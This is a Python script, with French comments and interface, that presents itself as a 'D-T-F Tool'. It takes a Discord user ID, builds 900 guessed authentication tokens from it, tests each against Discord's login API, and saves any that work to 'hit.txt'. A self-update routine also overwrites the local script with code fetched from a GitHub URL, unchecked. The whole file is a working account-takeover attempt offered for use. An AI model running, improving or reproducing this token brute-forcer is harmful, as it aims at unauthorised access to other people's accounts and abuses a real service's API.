import base64
import os
import random
import string
import requests
from colorama import init
from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.text import Text
from rich.table import Table
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn
from rich.align import Align

# Initialisation de Colorama et Rich
init(autoreset=True)
console = Console()

# URL pour vérifier les mises à jour
UPDATE_URL = "https://raw.githubusercontent.com/ErrorNoName/D-T-F/refs/heads/main/main.py"
LOCAL_SCRIPT = "main.py"

# Fonction pour vérifier et appliquer les mises à jour
def check_updates():
    console.print("[cyan]Vérification des mises à jour...[/cyan]")
    try:
        response = requests.get(UPDATE_URL)
        if response.status_code == 200:
            if not os.path.exists(LOCAL_SCRIPT):
                with open(LOCAL_SCRIPT, "w") as local_file:
                    local_file.write(response.text)
                console.print("[green]Script téléchargé. Redémarrez le script ![/green]")
                exit()
            else:
                with open(LOCAL_SCRIPT, "r") as local_file:
                    if local_file.read() != response.text:
                        with open(LOCAL_SCRIPT, "w") as local_file:
                            local_file.write(response.text)
                        console.print("[green]Mise à jour appliquée. Redémarrez le script ![/green]")
                        exit()
                    else:
                        console.print("[green]Script à jour ![/green]")
        else:
            console.print("[red]Impossible de vérifier les mises à jour.[/red]")
    except Exception as e:
        console.print(f"[red]Erreur lors de la vérification : {e}[/red]")

# Fonction pour générer un token
def generate_token(id_to_token):
    return (
        id_to_token + "." +
        ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + "." +
        ''.join(random.choices(string.ascii_letters + string.digits, k=25))
    )

# Fonction principale
def main():
    # Afficher le logo au centre
    logo = """
    ┳┓  ┏┳┓  ┏┓
    ┃┃   ┃   ┣ 
    ┻┛   ┻   ┻ 
    EZIO/ErrorNoName        
    """
    logo_panel = Panel(
        Align.center(Text(logo, justify="center"), vertical="middle"),
        title="D-T-F Tool",
        style="bold cyan",
        expand=False
    )
    console.print(logo_panel)

    # Vérification des mises à jour
    check_updates()

    # Créer une interface centrée pour saisir l'ID
    id_prompt = Panel(
        Align.center(Text("Entrez votre ID pour générer les tokens :", justify="center"), vertical="middle"),
        title="Saisie de l'ID",
        style="bold magenta",
        expand=False,
    )
    console.print(id_prompt)
    id_input = console.input("[bold cyan]→ ID TO TOKEN : [/]").strip()

    # Vérifier que l'ID n'est pas vide
    if not id_input:
        console.print("[red]L'ID ne peut pas être vide. Veuillez redémarrer le script et entrer un ID valide.[/red]")
        return

    # Encodage de l'ID
    id_to_token = base64.b64encode(id_input.encode("ascii")).decode("ascii")

    # Boîte d'attente avec bouton simulé
    start_prompt = Panel(
        Align.center(Text("Appuyez sur [bold green][Entrée][/bold green] pour démarrer la génération et la vérification des tokens !", justify="center"), vertical="middle"),
        style="bold blue",
        expand=False,
    )
    console.print(start_prompt)
    console.input("")  # Attente de validation

    # Initialisation des listes pour les résultats
    valid_tokens = []
    invalid_tokens = []
    total_tokens = 900  # Nombre total de tokens à générer

    # Création des tables pour les tokens valides et invalides
    table_valid = Table(title="Tokens Valides", show_header=True, header_style="bold green")
    table_valid.add_column("Token", justify="center", style="green")

    table_invalid = Table(title="Tokens Invalides", show_header=True, header_style="bold red")
    table_invalid.add_column("Token", justify="center", style="red")

    # Configuration du layout pour afficher les tables côte à côte
    layout = Layout()

    # Diviser la mise en page en header, body et footer
    layout.split_column(
        Layout(name="header", size=10),
        Layout(name="body", ratio=1),
        Layout(name="footer", size=3),
    )

    # Header avec le logo
    layout["header"].update(
        Panel(
            Align.center(Text(logo, justify="center"), vertical="middle"),
            style="bold cyan"
        )
    )

    # Body divisé en deux colonnes pour les tables
    layout["body"].split_row(
        Layout(Panel(table_valid, title="Résultats Valides", style="bold green")),
        Layout(Panel(table_invalid, title="Résultats Invalides", style="bold red")),
    )

    # Footer avec le compteur
    footer_panel = Panel(
        Align.center(Text("Tokens générés : 0/900 | Valides : 0 | Invalides : 0", justify="center"), vertical="middle"),
        style="bold yellow"
    )
    layout["footer"].update(footer_panel)

    # Utilisation de Live pour mettre à jour l'affichage en temps réel
    with Live(layout, refresh_per_second=10, screen=True, console=console):
        # Initialisation du compteur
        tokens_generated = 0

        # Création d'une barre de progression
        progress = Progress(
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(),
            transient=True,
            console=console,
        )
        task = progress.add_task("[cyan]Génération et vérification des tokens...", total=total_tokens)

        # Boucle de génération et de vérification des tokens
        for _ in range(total_tokens):
            token = generate_token(id_to_token)
            headers = {'Authorization': token}
            try:
                response = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
                if response.status_code == 200:
                    valid_tokens.append(token)
                    table_valid.add_row(token)
                else:
                    invalid_tokens.append(token)
                    table_invalid.add_row(token)
            except requests.RequestException:
                invalid_tokens.append(token)
                table_invalid.add_row(token)

            tokens_generated += 1
            progress.advance(task)

            # Mettre à jour le compteur dans le footer
            layout["footer"].update(
                Panel(
                    Align.center(
                        Text(f"Tokens générés : {tokens_generated}/{total_tokens} | Valides : {len(valid_tokens)} | Invalides : {len(invalid_tokens)}",
                             justify="center"),
                        vertical="middle"
                    ),
                    style="bold yellow"
                )
            )

        # Attendre que la barre de progression se termine
        progress.stop()

    # Enregistrer les tokens valides dans un fichier
    with console.status("[cyan]Enregistrement des tokens valides dans 'hit.txt'...", spinner="dots"):
        try:
            with open("hit.txt", "w") as file:
                for token in valid_tokens:
                    file.write(f"{token}\n")
            console.print("[green]Enregistrement terminé ![/green]")
        except Exception as e:
            console.print(f"[red]Erreur lors de l'enregistrement : {e}[/red]")

    # Afficher un message de fin
    console.print(Panel("[bold cyan]Processus terminé ![/bold cyan]", style="bold green"))

# Exécution principale
if __name__ == "__main__":
    main()
